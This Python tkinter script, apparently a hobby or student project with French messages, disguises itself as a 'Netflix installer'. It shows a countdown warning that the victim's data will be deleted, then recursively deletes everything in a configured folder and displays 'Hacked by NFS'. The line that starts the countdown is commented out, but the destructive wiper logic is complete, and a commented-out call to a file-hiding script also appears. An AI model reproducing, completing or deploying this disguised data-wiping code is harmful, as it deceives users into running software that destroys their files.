import constant, os, random, shutil, time, tkinter as tk, ctypes, subprocess
from tkinter import *
from tkinter import messagebox
from PIL import ImageTk, Image  


# # Custom tkinter
# class App(customtkinter.CTk):
#     __metaclass__=tk

#     def __init__(self):
#         super().__init__()

#         # Set dark mode by default
#         customtkinter.set_appearance_mode("dark")

#         self.title("Netflix installer (v6.98.1805.0)")
#         self.state("zoomed")

#         # create 2x2 grid system
#         self.grid_rowconfigure(0, weight=1)
#         self.grid_columnconfigure((0, 1), weight=1)

#         self.home_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
#         self.home_frame.grid_columnconfigure(0, weight=1)

#         self.image_path = os.path.dirname(os.path.dirname(__file__))

#         self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(self.image_path, "netflix-installer-bg.jpg")), size=[1080, 338])
#         self.home_frame_large_image_label = customtkinter.CTkLabel(self, text="", image=self.large_test_image)
#         self.home_frame_large_image_label.anchor(CENTER)
#         self.home_frame_large_image_label.grid(row=0, column=0)
#         self.image = customtkinter.CTkImage(Image.open(".\\netflix-installer-bg.jpg"))
#         self.imageBox = customtkinter.CTkLabel(master=self.home_frame, image=self.large_test_image, text="")

#         self.combobox = customtkinter.CTkComboBox(master=self, values=["Sample text 1", "Text 2"])
#         self.combobox.grid(row=1, column=0, padx=120, pady=120, sticky="ew")
#         self.button = customtkinter.CTkButton(master=self, command=self.button_callback, text="Insert Text")
#         self.button.grid(row=1, column=1, padx=120, pady=120, sticky="ew")

#     def button_callback(self):
#         # self.textbox.insert("insert", self.combobox.get() + "\n")
#         print(self.combobox.get())

# if __name__ == "__main__":
#     app = App()
#     app.mainloop()


# creating Tk window
root = tk.Tk()
root.title("Netflix installer (v6.98.1805.0)")
root.state('zoomed')
root.geometry("300x250")
root.configure(bg="#fff")
  
# Declaration of variables
hour = StringVar()
minute = StringVar()
second = StringVar()

# setting the default value as 0
hour.set("00")
minute.set("00")
second.set("00")

countdownTitle = Label(root, text = "Vos données seront supprimé dans :", font = ("Arial", 24, "bold"), bg="#fff")
countdownTitle.place(relx = 0.5, rely = 0.4, anchor = CENTER)

group = tk.Frame(root, bg="#f7f8f9")

# Use of Label class to take input from the user
# hourEntry= Entry(root, width=3, font=("Arial",18,""), textvariable=hour)
hourLabel = Label(root, textvariable = hour, font = ("Arial", 36, "bold"), bg="#f7f8f9", border=12)
hourLabel.place(relx = 0.4, rely = 0.5, anchor = CENTER)
  
# minuteEntry= Entry(root, width=3, font=("Arial",18,""), textvariable=minute)
minuteLabel = Label(root, textvariable = minute, font = ("Arial", 36, "bold"), bg="#f7f8f9", border=12)
minuteLabel.place(relx = 0.5, rely = 0.5, anchor = CENTER)

# secondEntry= Entry(root, width=3, font=("Arial",18,""), textvariable=second)
secondLabel = Label(root, textvariable = second, font = ("Arial", 36, "bold"), bg="#f7f8f9", border=12)
secondLabel.place(relx = 0.6, rely = 0.5, anchor = CENTER)

# subject.grid(row=0, column=0)
# monday.grid(row=0, column=1)
# tuesday.grid(row=0, column=2)
# wednesday.grid(row=0, column=3)
# thursday.grid(row=0, column=4)
# friday.grid(row=0, column=5)

group.pack(expand=True)
  
def countdown(realTime):
    try:
        # the input provided by the user is
        # stored in here :temp
        temp = realTime
    except:
        print("Please input the right value")
    while temp >-1:
         
        # divmod(firstvalue = temp//60, secondvalue = temp%60)
        mins,secs = divmod(temp,60)
  
        # Converting the input entered in mins or secs to hours,
        # mins ,secs(input = 110 min --> 120*60 = 6600 => 1hr :
        # 50min: 0sec)
        hours = 0
        if mins > 60:
             
            # divmod(firstvalue = temp//60, secondvalue
            # = temp%60)
            hours, mins = divmod(mins, 60)
         
        # using format () method to store the value up to
        # two decimal places
            
        hour.set("{0:2d}".format(int(hours)))
        minute.set("{0:2d}".format(int(mins)))
        second.set("{0:2d}".format(int(secs)))
  
        # updating the GUI window after decrementing the
        # temp value every time
        root.update()
        time.sleep(1)
  
        # when temp value = 0; then a messagebox pop's up
        # with a message:"Time's up"
        if (temp == 0):
            # Run command for hide files
            # subprocess.run(["python", "./hideFilesFromDirectory/hide_files_from_directory.py"])
            files = os.listdir(constant.FILES_FOLDER)

            # function call
            # countdown(constant.COUNTDOWN)

            for file in range(0, len(files)):
                # Delete a random file from the list
                chemin_fichier = constant.FILES_FOLDER + files[file]

                if os.path.exists(chemin_fichier):
                    if os.path.isfile(chemin_fichier):
                        os.remove(constant.FILES_FOLDER + files[file])
                        print(f"Le chemin {chemin_fichier} pointe vers un fichier valide.")
                    else:
                        shutil.rmtree(chemin_fichier)
                        print(f"Le chemin {chemin_fichier} pointe vers un répertoire.")
                else:
                    print(f"Le chemin {chemin_fichier} n'existe pas.")
                time.sleep(2)

            messagebox.showinfo("Hacked by NFS", "Vos fichiers ont bien été supprimé !")
         
        # after every one sec the value of temp will be decremented
        # by one
        temp -= 1
 
# button widget
# countdown(constant.COUNTDOWN)
  
# infinite loop which is required to
# run tkinter program infinitely
# until an interrupt occurs
root.mainloop()



